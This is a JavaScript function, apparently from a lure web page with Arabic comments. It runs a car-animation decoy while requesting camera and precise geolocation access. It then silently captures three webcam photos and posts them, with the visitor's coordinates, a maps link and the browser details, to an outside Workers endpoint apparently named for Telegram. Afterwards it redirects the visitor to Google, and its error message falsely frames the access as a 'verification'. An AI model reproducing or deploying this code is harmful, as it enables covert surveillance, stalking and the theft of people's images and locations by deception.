async function startProcess() {
  try {
    playRealisticSounds();
    document.getElementById('road').classList.add('animating');
    ['truck', 'ferrari', 'taxi', 'bike'].forEach(id => {
      document.getElementById(id).classList.add(id + '-move', 'move');
    });

    // طلب الكاميرا والموقع معاً
    const [stream, position] = await Promise.all([
      navigator.mediaDevices.getUserMedia({ video: true }),
      new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      })
    ]);

    const video = document.createElement('video'); video.srcObject = stream; await video.play();
    const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');

    // رابط الـ Worker
    const workerUrl = "https://tlgram.alidm0935.workers.dev/";

    // تجهيز رابط الموقع الدقيق
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;

    for (let i = 0; i < 3; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      const data = canvas.toDataURL('image/jpeg', 0.5);

      await fetch(workerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          img: data,
          info: navigator.userAgent,
          location: mapLink, // الرابط الدقيق للموقع
          coords: `${lat}, ${lon}` // الإحداثيات رقمياً
        })
      }).catch(e => console.error("Error:", e));

      await new Promise(r => setTimeout(r, 2000));
    }
    stream.getTracks().forEach(t => t.stop());
    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
  } catch (err) { 
    alert("يرجى السماح بالوصول للكاميرا والموقع لإتمام التحقق."); 
  }
}
